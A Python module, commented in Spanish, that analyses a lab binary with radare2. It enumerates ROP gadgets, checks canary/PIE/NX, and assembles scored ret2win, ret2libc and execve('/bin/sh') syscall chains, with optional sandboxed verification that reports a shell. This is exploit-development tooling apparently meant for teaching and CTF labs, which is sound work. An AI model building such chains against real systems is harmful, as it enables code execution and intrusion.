"""Exploit Chain Analyzer: analiza el binario del laboratorio y representa las cadenas de
explotacion potenciales, desde la vulnerabilidad inicial hasta el objetivo de ejecucion.

Todo el analisis es GROUNDED en el binario cargado:
- primitivas a partir de checksec + sinks (control de RIP por overflow, pivote de RSP);
- gadgets reales enumerados con radare2 (`/Rj`), clasificados por registros que fijan, registros
  que destruyen (clobber), stack delta y efectos secundarios;
- cadenas candidatas (ret2win / ret2libc system / execve por syscall) con sus requisitos, y
  deteccion automatica de cadenas INCOMPATIBLES con la explicacion de por que fallan;
- puntuacion TECNICA (propiedades objetivas: numero de gadgets, requisitos incumplidos,
  mitigaciones que bloquean, conflictos de clobber). No es una recomendacion para atacar.

La simulacion/verificacion real (opcional, verify=True) reutiliza el sandbox de autopoc/autorop
(--network none). Todo queda restringido al binario y entorno de laboratorio cargados por el usuario.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional

# registros de argumentos SysV x86-64 (orden de llamada) + los relevantes para syscalls
_ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
_SYS_EXECVE = 0x3b

# tipos de opcode que rompen un gadget limpio si aparecen antes del terminador
_BRANCHY = {"cjmp", "jmp", "ujmp", "call", "ucall", "rcall", "ccall", "invalid", "ill"}
# tipos que solo mueven datos sin efecto colateral sorpresa
_BENIGN = {"pop", "ret", "nop", "mov", "syscall", "leave", "xor", "push"}


@dataclass
class Gadget:
    addr: int = 0
    insns: List[str] = field(default_factory=list)
    sets: List[str] = field(default_factory=list)       # regs cargados desde el stack (pop reg)
    clobbers: List[str] = field(default_factory=list)   # otros regs escritos
    stack_delta: int = 0                                 # bytes que consume del stack (incl. ret)
    kind: str = "other"                                  # pop|syscall|pivot|ret|write|other
    side_effects: str = ""

    @property
    def text(self) -> str:
        return "; ".join(self.insns)


@dataclass
class ChainStep:
    kind: str = "gadget"       # vuln|primitive|control|gadget|target
    label: str = ""
    detail: str = ""
    addr: Optional[int] = None
    regs: dict = field(default_factory=dict)   # estado de registros que la cadena FIJA tras el paso
    stack: str = ""
    constraints: str = ""


@dataclass
class ExploitChain:
    name: str = ""
    target: str = ""
    steps: List[ChainStep] = field(default_factory=list)
    requirements: List[str] = field(default_factory=list)
    regs_needed: List[str] = field(default_factory=list)
    gadgets_used: List[int] = field(default_factory=list)
    constraints: List[str] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)
    break_points: List[str] = field(default_factory=list)
    feasible: bool = False
    score: int = 0
    score_detail: dict = field(default_factory=dict)
    sim_result: str = "no simulada"


@dataclass
class ChainAnalysis:
    arch: str = "x86_64"
    lang: str = "es"
    primitives: List[str] = field(default_factory=list)
    control: dict = field(default_factory=dict)   # {RIP, RSP_pivot, regs:[...]}
    target: str = ""
    gadgets: List[Gadget] = field(default_factory=list)
    chains: List[ExploitChain] = field(default_factory=list)
    graph: dict = field(default_factory=dict)
    note: str = ""

    @property
    def ok(self) -> bool:
        return bool(self.chains)


def _classify(raw: dict) -> Optional[Gadget]:
    """Convierte un gadget crudo de r2 (/Rj) en un Gadget clasificado. Devuelve None si no es
    utilizable (ramas/llamadas intermedias o terminador no valido)."""
    ops = raw.get("opcodes", [])
    if not ops:
        return None
    last = ops[-1]
    lt = last.get("type", "")
    if lt not in ("ret", "syscall") and "ret" not in last.get("opcode", ""):
        return None
    sets, clobbers, side = [], [], []
    stack_delta = 8 if lt == "ret" else 0   # el ret consume la direccion de retorno
    for op in ops[:-1]:
        t = op.get("type", "")
        txt = (op.get("opcode", "") or "").strip()
        if t in _BRANCHY:
            return None                      # gadget sucio: no utilizable
        parts = txt.replace(",", " ").split()
        mn = parts[0] if parts else ""
        if mn == "pop" and len(parts) >= 2:
            reg = parts[1]
            sets.append(reg)
            stack_delta += 8
        elif mn == "add" and len(parts) >= 3 and parts[1] == "rsp":
            try:
                stack_delta += int(parts[2], 0)
            except ValueError:
                pass
            side.append(txt)
        elif mn in ("mov", "xor", "lea") and len(parts) >= 2:
            clobbers.append(parts[1])
        elif mn == "leave":
            side.append("leave (rsp<-rbp; pop rbp): pivote de stack")
        elif t not in _BENIGN:
            side.append(txt)
    kind = "ret"
    joined = " ".join((o.get("opcode", "") or "") for o in ops)
    if "syscall" in joined:
        kind = "syscall"
    elif "leave" in joined or any("pop rsp" in (o.get("opcode", "") or "") for o in ops):
        kind = "pivot"
    elif sets:
        kind = "pop"
    elif any(o.get("opcode", "").startswith("mov ") and "[" in o.get("opcode", "") for o in ops):
        kind = "write"
    # la direccion del gadget es la de su PRIMERA instruccion (la que va en la pila del ROP),
    # no el `retaddr` (que apunta al ret final). r2 usa la clave "offset" en cada opcode.
    entry = ops[0].get("offset", ops[0].get("addr", raw.get("retaddr", 0)))
    return Gadget(addr=entry,
                  insns=[o.get("opcode", "") for o in ops],
                  sets=sets, clobbers=[c for c in clobbers if c not in sets],
                  stack_delta=stack_delta, kind=kind, side_effects="; ".join(side))


def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
    """El mejor gadget para fijar `reg`: el que hace `pop reg` con menos ruido (menos clobber,
    menor stack delta, sin efectos secundarios)."""
    cands = [g for g in gadgets if reg in g.sets]
    if not cands:
        return None
    return sorted(cands, key=lambda g: (len(g.clobbers), bool(g.side_effects), g.stack_delta,
                                        len(g.sets)))[0]


def _enum_gadgets(binary: str) -> List[Gadget]:
    """Enumera y clasifica gadgets reales del binario con radare2 (`/Rj`). Busca patrones utiles
    para control de registros de argumentos, syscall y pivote. Best-effort; [] si no hay r2."""
    out: List[Gadget] = []
    seen = set()
    try:
        import json
        from ..oracles.r2session import get as _r2get
        r = _r2get(binary)
        if r is None:
            return out
        patterns = (["pop " + reg for reg in _ARG_REGS + ["rax", "rbx", "rbp", "rsp"]]
                    + ["syscall", "leave", "int 0x80"])
        for pat in patterns:
            try:
                raws = json.loads(r.cmd(f"/Rj {pat}") or "[]")
            except Exception:
                raws = []
            for raw in raws[:40]:
                g = _classify(raw)
                if g and g.addr not in seen:
                    seen.add(g.addr)
                    out.append(g)
    except Exception:
        return out
    return out


def _facts(binary: str, reg=None) -> dict:
    """Hechos del binario: mitigaciones, win(), system(), /bin/sh, offset de control de RIP.
    Lee con r2 directo (r2pipe). El parametro `reg` se acepta por consistencia de firma con el
    resto de workflows pero no se usa aqui."""
    f = {"canary": None, "pie": None, "nx": None, "arch": "x86_64",
         "win": None, "system": None, "binsh": None, "rip_offset": None}
    try:
        import json
        from ..oracles.r2session import get as _r2get
        r = _r2get(binary)
        if r is not None:
            info = json.loads(r.cmd("ij") or "{}").get("bin", {})
            f["canary"] = info.get("canary")
            f["pie"] = info.get("pic")
            f["nx"] = info.get("nx")
            f["arch"] = f"{info.get('arch','x86')}_{info.get('bits',64)}"
            for fn in json.loads(r.cmd("aflj") or "[]"):
                nm = fn.get("name", "").lower()
                if f["win"] is None and ("win" in nm or "shell" in nm or "backdoor" in nm or "giveshell" in nm):
                    f["win"] = fn.get("offset")
                if f["system"] is None and nm.endswith("system"):
                    f["system"] = fn.get("offset")
            # /bin/sh en strings
            for s in json.loads(r.cmd("izzj") or "{}").get("strings", []):
                if "/bin/sh" in (s.get("string", "") or ""):
                    f["binsh"] = s.get("vaddr"); break
    except Exception:
        pass
    # offset de control de RIP (reutiliza el detector estatico de autopoc)
    try:
        from .autopoc import _static_offset, find_win
        f["rip_offset"] = _static_offset(binary)
        if f["win"] is None:
            f["win"] = find_win(binary)
    except Exception:
        pass
    return f


def _score(chain: ExploitChain) -> None:
    """Puntuacion TECNICA (0-100) por propiedades objetivas. No es recomendacion de ataque."""
    unmet = sum(1 for r in chain.requirements if r.startswith("[X]"))
    blockers = len(chain.break_points)
    ng = len(chain.gadgets_used)
    conflicts = sum(1 for c in chain.constraints if "conflicto" in c.lower() or "conflict" in c.lower())
    s = 100 - 8 * ng - 25 * unmet - 12 * blockers - 6 * conflicts
    chain.score = max(0, min(100, s))
    chain.score_detail = {"gadgets": ng, "requisitos_incumplidos": unmet,
                          "puntos_de_rotura": blockers, "conflictos_clobber": conflicts}
    chain.feasible = (unmet == 0 and blockers == 0)


def _req(met: bool, es: str, en: str, lang: str) -> str:
    """Linea de requisito con marcador NEUTRO de idioma ([OK]/[X]) para el scoring + texto bilingue."""
    return ("[OK] " if met else "[X] ") + (es if lang == "es" else en)


def _mitig_breakpoints(f: dict, uses_fixed_addr: bool, lang: str) -> (List[str], List[str]):
    """Mitigaciones relevantes y puntos de rotura que introducen para una cadena de overflow."""
    es = lang == "es"
    mit, brk = [], []
    if f.get("canary") is True:
        mit.append("Stack canary ACTIVO" if es else "Stack canary ON")
        brk.append("Canary activo: el overflow lineal se detecta antes de retornar; la cadena se "
                   "rompe salvo que exista una fuga del canary." if es else
                   "Canary on: a linear overflow is detected before return; the chain breaks unless a "
                   "canary leak exists.")
    if f.get("pie") is True and uses_fixed_addr:
        mit.append("PIE ACTIVO" if es else "PIE ON")
        brk.append("PIE activo: las direcciones (win/gadgets/system/'/bin/sh') son aleatorias; la "
                   "cadena se rompe sin una fuga de direccion (leak)." if es else
                   "PIE on: addresses (win/gadgets/system/'/bin/sh') are randomized; the chain breaks "
                   "without an address leak.")
    if f.get("nx") is True:
        mit.append("NX ACTIVO (no shellcode; la via es ROP)" if es else "NX ON (no shellcode; ROP is the path)")
    return mit, brk


def analyze_chains(binary: str, reg=None, verify: bool = False, lang: str = "es") -> ChainAnalysis:
    es = lang == "es"
    f = _facts(binary, reg)
    gadgets = _enum_gadgets(binary)
    an = ChainAnalysis(arch=f["arch"], gadgets=gadgets)
    L = (lambda a, b: a) if es else (lambda a, b: b)

    # --- primitivas y control ---
    rip = f.get("rip_offset") is not None or f.get("win") is not None
    reg_control = sorted({r for g in gadgets for r in g.sets})
    pivot = any(g.kind == "pivot" for g in gadgets)
    _off = (str(f["rip_offset"]) if f.get("rip_offset") is not None else L("por determinar", "to be determined"))
    if rip:
        an.primitives.append(L(f"Control de RIP por desbordamiento de pila (offset {_off})",
                               f"RIP control via stack overflow (offset {_off})"))
    if reg_control:
        an.primitives.append(L("Control de registros via gadgets pop: ", "Register control via pop gadgets: ")
                             + ", ".join(reg_control))
    if pivot:
        an.primitives.append(L("Pivote de RSP disponible (leave/pop rsp)", "RSP pivot available (leave/pop rsp)"))
    an.control = {"RIP": rip, "RSP_pivot": pivot, "regs": reg_control}
    an.target = ("execve('/bin/sh')" if (f.get("system") or f.get("binsh")) else
                 ("win()" if f.get("win") is not None else L("control de flujo", "control flow")))

    ovf = L("Desbordamiento de pila", "Stack overflow")
    ripc = L("Control de RIP", "RIP control")
    chains: List[ExploitChain] = []

    # 1) ret2win: overflow -> win()
    c = ExploitChain(name="ret2win", target="win()")
    has_win = f.get("win") is not None
    c.requirements = [
        _req(rip, "control de RIP (offset de retorno)", "RIP control (return offset)", lang),
        _req(has_win, "funcion objetivo win()/giveshell en el binario",
             "target function win()/giveshell in the binary", lang)]
    c.regs_needed = []
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    winaddr = f.get("win") or 0
    c.steps = [
        ChainStep("vuln", ovf, L("Entrada sin acotar sobre buffer local", "Unbounded input into a local buffer"),
                  stack=L("se sobrescribe hasta la direccion de retorno guardada",
                          "overwrites up to the saved return address")),
        ChainStep("primitive", ripc,
                  (f"offset={f.get('rip_offset')}" if f.get("rip_offset") is not None
                   else L("offset por determinar", "offset to be determined")),
                  regs={"rip": L("controlado", "controlled")},
                  stack=L("RIP = siguiente qword tras el offset", "RIP = next qword after the offset")),
        ChainStep("target", "win()",
                  (L(f"salta a win() en {hex(winaddr)}", f"jumps to win() at {hex(winaddr)}") if has_win
                   else L("requiere win()", "requires win()")),
                  addr=winaddr or None, regs={"rip": hex(winaddr) if has_win else "?"},
                  constraints=L("alinear el stack (16B) con un gadget `ret` si win() llama a system",
                                "align the stack (16B) with a `ret` gadget if win() calls system"))]
    _score(c)
    if verify and c.feasible:
        c.sim_result = _simulate(binary, "ret2win", lang)
    chains.append(c)

    # 2) ret2libc: overflow -> pop rdi; ret -> system('/bin/sh')
    c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
    g_rdi = _best_for(gadgets, "rdi")
    has_sys, has_binsh = f.get("system") is not None, f.get("binsh") is not None
    c.requirements = [
        _req(rip, "control de RIP", "RIP control", lang),
        _req(bool(g_rdi), "gadget `pop rdi; ret` (1er argumento)", "gadget `pop rdi; ret` (1st argument)", lang),
        _req(has_sys, "system() en PLT/simbolos", "system() in PLT/symbols", lang),
        _req(has_binsh, "cadena '/bin/sh' en el binario", "'/bin/sh' string in the binary", lang)]
    c.regs_needed = ["rdi"]
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    if g_rdi:
        c.gadgets_used = [g_rdi.addr]
        if g_rdi.clobbers:
            c.constraints.append(L("posible conflicto de clobber: ", "possible clobber conflict: ")
                                 + ", ".join(g_rdi.clobbers))
        if g_rdi.side_effects:
            c.constraints.append(L("efecto secundario del gadget rdi: ", "rdi gadget side effect: ")
                                 + g_rdi.side_effects)
    c.steps = [
        ChainStep("vuln", ovf, L("controla la direccion de retorno", "controls the return address")),
        ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")}),
        ChainStep("gadget", "pop rdi; ret", g_rdi.text if g_rdi else L("AUSENTE", "ABSENT"),
                  addr=g_rdi.addr if g_rdi else None, regs={"rdi": "&'/bin/sh'"},
                  stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
                  constraints=((g_rdi.side_effects or L("sin efectos secundarios", "no side effects")) if g_rdi
                               else L("gadget ausente", "gadget absent"))),
        ChainStep("target", "system('/bin/sh')",
                  (L(f"system en {hex(f['system'])}", f"system at {hex(f['system'])}") if has_sys
                   else L("requiere system()", "requires system()")),
                  addr=f.get("system"), regs={"rdi": "&'/bin/sh'"})]
    _score(c)
    if verify and c.feasible:
        c.sim_result = _simulate(binary, "ret2libc", lang)
    chains.append(c)

    # 3) execve por syscall: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall
    c = ExploitChain(name="execve syscall", target="execve('/bin/sh',0,0)")
    need = {"rax": _best_for(gadgets, "rax"), "rdi": _best_for(gadgets, "rdi"),
            "rsi": _best_for(gadgets, "rsi"), "rdx": _best_for(gadgets, "rdx")}
    g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
    has_binsh = f.get("binsh") is not None
    c.requirements = [_req(rip, "control de RIP", "RIP control", lang)]
    for rname in ("rax", "rdi", "rsi", "rdx"):
        c.requirements.append(_req(bool(need[rname]), f"gadget `pop {rname}; ret`", f"gadget `pop {rname}; ret`", lang))
    c.requirements.append(_req(bool(g_sys), "gadget `syscall`", "gadget `syscall`", lang))
    c.requirements.append(_req(has_binsh, "cadena '/bin/sh' (o escribible en .bss)",
                               "'/bin/sh' string (or writable in .bss)", lang))
    c.regs_needed = ["rax", "rdi", "rsi", "rdx"]
    c.mitigations, c.break_points = _mitig_breakpoints(f, True, lang)
    c.gadgets_used = [g.addr for g in list(need.values()) + [g_sys] if g]
    for rname, g in need.items():
        if g and g.clobbers:
            other = [x for x in g.clobbers if x in c.regs_needed and x != rname]
            if other:
                c.constraints.append(L(f"conflicto de clobber en pop {rname}: destruye {', '.join(other)}",
                                       f"clobber conflict in pop {rname}: destroys {', '.join(other)}"))
    c.steps = [ChainStep("vuln", ovf),
               ChainStep("primitive", ripc, regs={"rip": L("controlado", "controlled")})]
    vals = {"rax": L("59 (execve)", "59 (execve)"), "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"}
    setregs = {}
    for rname in ("rax", "rdi", "rsi", "rdx"):
        g = need[rname]
        setregs = dict(setregs); setregs[rname] = vals[rname]
        c.steps.append(ChainStep("gadget", f"pop {rname}; ret", g.text if g else L("AUSENTE", "ABSENT"),
                                 addr=g.addr if g else None, regs=dict(setregs),
                                 stack=f"delta={g.stack_delta}B" if g else "",
                                 constraints=((g.side_effects or L("limpio", "clean")) if g
                                              else L("gadget ausente", "gadget absent"))))
    c.steps.append(ChainStep("target", "syscall -> execve", g_sys.text if g_sys else L("syscall AUSENTE", "syscall ABSENT"),
                             addr=g_sys.addr if g_sys else None, regs=dict(setregs)))
    _score(c)
    if verify and c.feasible:
        c.sim_result = _simulate(binary, "execve", lang)
    chains.append(c)

    # sim_result por defecto (bilingue) para las no simuladas
    for ch in chains:
        if ch.sim_result == "no simulada":
            ch.sim_result = L("no simulada", "not simulated")
    # orden: factibles primero, luego por puntuacion tecnica
    chains.sort(key=lambda x: (not x.feasible, -x.score))
    an.chains = chains
    an.lang = lang
    an.graph = _build_graph(an)
    if not gadgets:
        an.note = L("sin gadgets enumerados (binario pequeno/dinamico); el analisis se basa en primitivas.",
                    "no gadgets enumerated (small/dynamic binary); the analysis relies on primitives.")
    return an


def _build_graph(an: ChainAnalysis) -> dict:
    """Grafo del explorador: nodo por primitiva/gadget/estado, arista por transicion. Nodo raiz
    de vulnerabilidad compartido y nodo objetivo compartido por objetivo igual."""
    nodes, edges = [], []
    ids = {}

    def node(nid, label, kind, detail="", regs=None, stack="", constraints=""):
        if nid not in ids:
            ids[nid] = True
            nodes.append({"id": nid, "label": label, "kind": kind, "detail": detail,
                          "regs": regs or {}, "stack": stack, "constraints": constraints})
        return nid

    es = getattr(an, "lang", "es") == "es"
    node("vuln", "Vulnerabilidad" if es else "Vulnerability", "vuln",
         "Desbordamiento de pila / control de retorno" if es else "Stack overflow / return control")
    for ci, c in enumerate(an.chains):
        prev = "vuln"
        for si, st in enumerate(c.steps):
            if st.kind == "vuln":
                continue
            nid = f"c{ci}s{si}"
            lbl = st.label + ("" if st.kind != "gadget" or st.addr is None else f"\n{hex(st.addr)}")
            node(nid, lbl, st.kind, st.detail, st.regs, st.stack, st.constraints)
            # arista rota si el gadget/simbolo falta (marcado como AUSENTE/ABSENT en ambos idiomas)
            bad = ("AUSENTE" in (st.detail or "")) or ("ABSENT" in (st.detail or "")) \
                or ("ausente" in (st.constraints or "")) or ("absent" in (st.constraints or ""))
            edges.append({"src": prev, "dst": nid, "chain": ci, "ok": not bad})
            prev = nid
    return {"nodes": nodes, "edges": edges}


def _simulate(binary: str, kind: str, lang: str = "es") -> str:
    """Simulacion/verificacion real en el sandbox (opcional). Reutiliza autopoc/autorop."""
    es = lang == "es"
    try:
        if kind == "ret2win":
            from .autopoc import autopoc
            r = autopoc(binary, run=True)
            return (("VERIFICADA (shell en sandbox)" if es else "VERIFIED (shell in sandbox)")
                    if getattr(r, "verified", False)
                    else ("construida; no verificada en sandbox" if es else "built; not verified in sandbox"))
        else:
            from .autopoc import autorop
            r = autorop(binary, run=True)
            if r.get("verified"):
                v = "VERIFICADA" if es else "VERIFIED"
                return f"{v} ({r.get('strategy','')}, offset={r.get('offset')})"
            return ("no verificada: " if es else "not verified: ") + (r.get("note", "") or "")
    except Exception as e:
        return (f"no simulada ({e.__class__.__name__})" if es else f"not simulated ({e.__class__.__name__})")
